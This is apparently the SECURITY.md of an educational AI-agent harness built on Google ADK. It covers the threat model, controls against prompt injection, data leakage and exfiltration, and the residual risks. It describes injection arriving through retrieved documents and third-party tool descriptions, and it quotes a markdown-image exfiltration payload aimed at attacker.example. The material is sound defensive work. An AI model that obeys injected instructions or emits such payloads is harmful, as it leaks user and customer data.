# Security

This document says what the harness defends against, how, and — more usefully —
what it does **not** defend against. A reference implementation that lists only
its controls is marketing.

---

## Threat model

**Assets.** Customer records reachable through tools; credentials held by the
service; the integrity of state-changing actions (refunds, writes); the model
spend attached to your account; the audit trail.

**Adversaries, in the order they actually show up.**

1. **A careless user.** Pastes a key, pastes somebody else's personal data,
   asks the assistant to do something it should not. Overwhelmingly the most
   common, and the one most systems handle worst because it is not "an attack".
2. **Content the agent retrieves.** A support ticket, a wiki page, a PDF, a
   web page, a third-party MCP server's tool description. The attacker writes
   to a channel the user cannot see and the model treats as instructions.
3. **A malicious user.** Deliberate jailbreaks, scope probing, attempts to
   reach another tenant's data.
4. **A compromised or hostile tool.** An MCP server you do not operate.

**Explicitly out of scope.** A compromised host or container runtime; a
malicious operator with database access; the model provider itself; supply
chain attacks on Python dependencies. Those need controls that live below this
layer.

---

## Controls, mapped to what they stop

### 1. Prompt injection — the one people ask about

Three layers, in order of how much they actually do:

**Architectural (does the work).** A subagent that reads untrusted content
holds no write scopes — `agents/specs.py::child_scopes` intersects with the
parent and then strips every `*.write`. A successful injection reaches a model
that has nothing dangerous to call.

**Procedural (does the rest).** Every state-changing tool is declared
`FunctionTool(fn, require_confirmation=True)`. ADK suspends the run and a human
decides; the resume carries a `ToolConfirmation` bound to the original function
call id, on the original session. An injected instruction cannot approve
itself, and an approval id alone is not enough — the HTTP layer checks that the
session belongs to the caller's tenant before resuming.

**Detection (the alarm, not the sprinkler).** `guardrails/detectors.py`
heuristics, applied with a surface distinction: injection-shaped text from a
*user* is flagged and metered; the identical text from a *tool result* is
blocked. Pinned by `test_injection_from_a_document_is_blocked`.

> **Honest limit.** Every heuristic here is bypassable and will be bypassed.
> Treat the detector as telemetry — a number you alert on, correlated with
> which document the agent had just retrieved. If your design depends on
> catching injections by pattern, the design is wrong.

Also covered, and frequently missed: **a third-party tool's *description* is
prompt text.** `tools/mcp.py` strips control characters, caps the length, and
screens every imported description through the injection detector before it can
reach a system prompt.

### 2. Data leakage

- Tool output is scanned with `surface="tool_output"` in the plugin's
  `after_tool_callback`, **before** the result re-enters the prompt. This is
  the surface that actually carries customer data — nobody types a card
  number, the billing API returns one.
- Output rails scan the answer. `AH_GUARDRAIL_STRICT_OUTPUT` is a genuine
  policy fork, not a tuning knob: redact for an internal support tool, block
  for anything public or multi-tenant.
- **The audit log is ADK's session event history**, and it records what the
  model was actually given — which, because the redaction happens in
  `after_tool_callback` before the result is returned to the runtime, is the
  redacted form. There is deliberately no second audit log: two logs drift.

### 3. Exfiltration

`ExfiltrationRail` blocks `![](https://attacker.example/?d=<secret>)` — the
zero-click case, where merely *rendering* the answer in a chat UI makes the
request — and redacts links to hosts outside `allowed_domains`. An empty
allowlist means no external links at all, which is the right default for an
internal assistant.

### 4. Privilege and authorisation

Effective scopes are `caller ∩ agent`, computed in `runtime/harness.py`, so
neither the token nor the agent spec can escalate the other.

Two layers, and it matters which is which. `tools_for()` filters the catalogue
by scope and tag — that is a **cost and correctness** control: a model cannot
misuse a tool it was never shown, and every omitted tool is tokens saved on
every step. The **security** control is `before_tool_callback`, which refuses
the call regardless of what reached the catalogue. Keep both; the day somebody
widens an agent definition and forgets the token side, only the second one
saves you.

ADK has no notion of scopes at all. A tool in an agent's list is callable. All
of the above is ours.

### 5. Credentials

- Blocked in either direction, never redacted. If a key has been pasted it must
  be rotated, and silently stripping it means nobody ever learns that.
- `agents/models.py::configure_credentials` resolves `GOOGLE_API_KEY` once,
  removes the duplicate `GEMINI_API_KEY` (having both set produces a warning
  and a silent precedence rule), and pins `GOOGLE_GENAI_USE_VERTEXAI=FALSE`.
  The key is never logged — only whether one is present.
- `Settings.redacted()` reports `api_key_present`, never the value. Pinned by
  `test_redacted_never_contains_the_key`.
- `AH_SERVICE_TOKENS` stores `tok_XXXX` — the first four characters — never the
  token.
- Provider 401/403 bodies are never surfaced: they can echo key fragments.

### 6. Code execution

`tools/domain.py::calculator` walks the AST and refuses every node that is not
arithmetic. `eval()` on model output is remote code execution with extra steps,
and the model does not have to be malicious for it to bite — it only has to be
persuaded by a document it retrieved. Pinned by
`test_calculator_refuses_anything_that_is_not_arithmetic`.

### 7. Denial of wallet

A tool-using agent is an unusually good amplifier: one request can become
dozens of model calls. `LengthRail` caps the input. Three independent ceilings
cap the run — `AH_MAX_MODEL_CALLS` (enforced by ADK), `AH_RUN_TIMEOUT_S` and
`AH_BUDGET_USD_PER_RUN` (both ours). The token bucket caps the tenant. Retries are
capped by `RETRY` in `agents/models.py` (ADK's own default is not to retry).

### 8. Tenant isolation

Session lookups and approval decisions are scoped to the caller's tenant, and
ADK sessions are keyed by `user_id`, so one tenant cannot read or resume
another's. A foreign session returns **404, not 403** — otherwise the status
code confirms it exists.

---

## Residual risks — read this part

| Risk | Status | What to do |
|---|---|---|
| Prompt injection via retrieved content | **Mitigated, not solved** | Keep writes behind approval. Do not widen subagent scopes for convenience |
| Detector false negatives (obfuscation, encoding, other languages) | **Accepted** | Put a real DLP/NER stack behind `detectors.py`; regex is the first pass |
| A slow tool has no per-tool timeout | **Accepted** | ADK does not expose one per FunctionTool; the run-level wall clock is the backstop. Put the timeout in the tool's own client |
| Grounding rail is term overlap, not entailment | **Accepted** | `ALLOW`-with-findings by default. Measure before promoting to block |
| `AH_SERVICE_TOKENS` is a dev credential store | **Must be replaced** | Your identity provider. Keep the shape: the caller never states its own tenant |
| `adk web` runs with the agent's full scopes | **By design, dev only** | It has no bearer token to derive scopes from. Never expose `adk web` beyond a laptop |
| `adk_agents/c05_guardrails_off` is an agent with the rails off | **By design, dev only** | It is the control group the other apps are compared against, and `AH_GUARDRAIL_MODE=off` is refused unless `AH_ENV=dev`, so it cannot start anywhere else |
| The model-call and wall-clock ceilings do not apply under `adk web` | **Known gap, dev only** | Both live on the harness's run path, not the plugin. Under ADK's server, `ADK_MAX_LLM_CALLS` is the only one, and exceeding it is an HTTP 500 rather than an honest stop. Anything user-facing goes through the harness or the API |
| Cost ledger and rate limiter are in process | **Must be fixed before relying on them** | Move both behind Redis. Until then run one worker per container, or a 60/min limit becomes 60 per worker |
| No tamper evidence on ADK's session events | **Open** | Hash-chain an export if you need it. Do not keep a second log |
| Subagent output is unverifiable by the parent | **Accepted** | `AgentTool` keeps provenance in the trace; the parent still cannot check the content |
| Model provider sees prompts | **Out of scope** | Contractual and regional controls, plus redaction before egress |

---

## Deployment checklist

- [ ] `AH_ENV` is not `dev`. (`config.py` refuses `AH_GUARDRAIL_MODE=off` outside dev.)
- [ ] `AH_SERVICE_TOKENS` replaced by a real identity provider.
- [ ] Guardrails ran in **`shadow`** long enough to know the false positive
      rate on your traffic, and only then promoted to `enforce`. Shipping
      straight to enforce is the single most common way a guardrail programme
      fails: a wave of blocked legitimate requests, support escalates, rails
      get switched off permanently.
- [ ] `AH_GUARDRAIL_STRICT_OUTPUT` set deliberately, and written down.
- [ ] `agent-harness health` reports `model_price_known: true`. If not, every
      cost figure and every budget decision is based on a fallback rate.
- [ ] `allowed_domains` set per tenant, or left empty to forbid links entirely.
- [ ] Budgets sized against real traffic, not guessed.
- [ ] `require_confirmation=True` reviewed for every tool. Anything that
      writes, pays, emails, deletes or escalates needs it.
- [ ] `AH_SESSION_DB_URL` points at a real database, so the audit trail
      survives a restart.
- [ ] `LAST_VERIFIED` in `pricing.py` is recent, and reconciled against the
      provider's billing export.
- [ ] Container runs non-root, read-only root filesystem, dropped capabilities
      (the shipped `docker-compose.yml` does all three).
- [ ] Alerts wired for the four signals in `docs/prometheus.yml`.
- [ ] A retention policy exists for ADK's sessions and events. Agent session
      history is a data-retention surface most teams never classify: it
      accumulates customer detail from thousands of conversations with no
      owner and no expiry.
- [ ] Someone owns both eval suites — `make evals` for governance and
      `adk eval` for quality — and they gate the deploy.

---

## Reporting

This is educational reference code published alongside an article. If you find
a flaw in it, open an issue — and please do not use it as an example of how to
handle a vulnerability report in a system that has real users.
